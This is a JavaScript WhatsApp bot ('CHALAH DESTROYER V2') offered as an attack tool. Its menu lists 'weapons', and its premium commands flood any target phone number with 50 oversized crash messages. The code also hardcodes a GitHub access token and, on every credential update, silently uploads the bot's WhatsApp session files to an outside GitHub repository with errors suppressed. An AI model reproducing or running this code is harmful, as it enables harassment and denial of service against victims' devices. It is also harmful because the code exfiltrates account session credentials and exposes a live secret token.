const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    delay, 
    fetchLatestBaileysVersion, 
    DisconnectReason, 
    Browsers 
} = require("@whiskeysockets/baileys");
const pino = require("pino");
const fs = require("fs");
const axios = require("axios");

// --- ULTRA CONFIG ---
const ownerNumber = "94742271802";
const logoUrl = 'https://files.catbox.moe/07hh33.png';
const voiceUrl = 'https://files.catbox.moe/xk6low.mp4';
const GITHUB_TOKEN = "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";
const GITHUB_REPO = "btest2619-sudo/Database-Md";
const SESSION_BRANCH = "session-data";

let premiumUsers = [ownerNumber];

// --- GITHUB SYNC ---
async function uploadToGitHub(filePath, content) {
    try {
        const url = `https://api.github.com/repos/${GITHUB_REPO}/contents/${filePath}`;
        let sha = null;
        try {
            const ex = await axios.get(url, {
                headers: { 'Authorization': `token ${GITHUB_TOKEN}` },
                params: { ref: SESSION_BRANCH }
            });
            sha = ex.data.sha;
        } catch (e) {}

        await axios.put(url, {
            message: `Sync ${filePath}`,
            content: Buffer.from(content).toString('base64'),
            branch: SESSION_BRANCH,
            sha: sha || undefined
        }, {
            headers: { 'Authorization': `token ${GITHUB_TOKEN}` }
        });
    } catch (e) {
        // Silent error to prevent crash
    }
}

async function startBot() {
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version, isLatest } = await fetchLatestBaileysVersion();

    const client = makeWASocket({
        version,
        auth: state,
        printQRInTerminal: true, // QR Support
        logger: pino({ level: "silent" }),
        browser: Browsers.macOS("Desktop"), // Stable connection profile
        syncFullHistory: false
    });

    client.ev.on('connection.update', async (u) => {
        const { connection, lastDisconnect, qr } = u;
        
        if (qr) {
            console.log("⚡ SCAN THE QR CODE TO START CHALAH DESTROYER!");
        }

        if (connection === 'open') {
            console.log("🔥 CHALAH DESTROYER V2 ONLINE!");
        }

        if (connection === 'close') {
            const shouldReconnect = lastDisconnect.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log("🔄 CONNECTION CLOSED. RECONNECTING...", shouldReconnect);
            if (shouldReconnect) startBot();
        }
    });

    client.ev.on("messages.upsert", async (chat) => {
        const m = chat.messages[0];
        if (!m.message || m.key.fromMe) return;

        const from = m.key.remoteJid;
        const sn = m.key.participant ? m.key.participant.split('@')[0] : from.split('@')[0];
        const isPrem = premiumUsers.includes(sn) || sn === ownerNumber;
        const body = m.message.conversation || m.message.extendedTextMessage?.text || "";
        const cmd = body.startsWith(".") ? body.slice(1).trim().split(" ")[0].toLowerCase() : "";
        const q = body.trim().split(" ").slice(1).join(" ");

        if (cmd === 'menu') {
            const menu = `
╭───〔 **${"CHALAH 404 V2".toUpperCase()}** 〕───┈⊷
│ 👤 **USER:** @${sn}
│ 👑 **RANK:** ${isPrem ? 'PREMIUM DESTROYER' : 'FREE USER'}
╰────────────────────────┈⊷

╭───〔 **🔴 FREE WEAPONS** 〕───┈⊷
│ ☢️ .uicrash (Freeze UI)
│ ☢️ .locbomb (Location Lag)
│ ☢️ .pollbug (Poll Overload)
│ ☢️ .textbomb (Char Flood)
│ ☢️ .ping (System Check)
│ ☢️ .alive (Bot Status)
╰────────────────────────┈⊷

╭───〔 **🔱 PREMIUM (DEADLY)** 〕───┈⊷
│ 💀 .rip (DB-Overflow)
│ 💀 .die (System Killer)
│ 💀 .full (Storage Grave)
│ 💀 .lag (Infinite Loop)
│ 💀 .404 (Render Crash)
│ 💀 .end (Status Killer)
│ 💀 .hell (Fatal Exploit)
╰────────────────────────┈⊷

╭───〔 **⚙️ SYSTEM** 〕───┈⊷
│ 🛠️ .premium [number]
│ 🛠️ .owner (Contact Dev)
╰────────────────────────┈⊷

_⚠️ POWERED BY CHALAH-SUDO_`;

            await client.sendMessage(from, { 
                image: { url: logoUrl }, 
                caption: menu, 
                mentions: [m.key.participant || from] 
            });
            await client.sendMessage(from, { 
                audio: { url: voiceUrl }, 
                mimetype: 'audio/mp4', 
                ptt: true 
            }, { quoted: m });
        }

        // --- PREMIUM BUG SYSTEM ---
        if (['rip', 'die', 'full', 'lag', '404', 'end', 'hell'].includes(cmd)) {
            if (!isPrem) return client.sendMessage(from, { text: "🚫 *ACCESS DENIED!* \nPremium membership needed for deadly weapons." }, { quoted: m });
            
            const target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
            if (!q) return client.sendMessage(from, { text: "Target Number?" }, { quoted: m });

            client.sendMessage(from, { text: `☣️ *INJECTING DEADLY PAYLOADS...*\nTarget: ${q}\nStrength: 100%` });

            for(let i=0; i<50; i++) {
                const deadlyMsg = "‌".repeat(40000) + "⚰️".repeat(10000) + "VOID-404".repeat(5000);
                await client.sendMessage(target, { text: deadlyMsg });
                await delay(50);
            }
        }
    });

    client.ev.on("creds.update", async () => {
        await saveCreds();
        try {
            const files = fs.readdirSync('./session');
            for (const f of files) {
                const filePath = `./session/${f}`;
                if (fs.lstatSync(filePath).isFile()) {
                    await uploadToGitHub(`session/${f}`, fs.readFileSync(filePath, 'utf-8'));
                }
            }
        } catch (err) {}
    });
}

startBot();

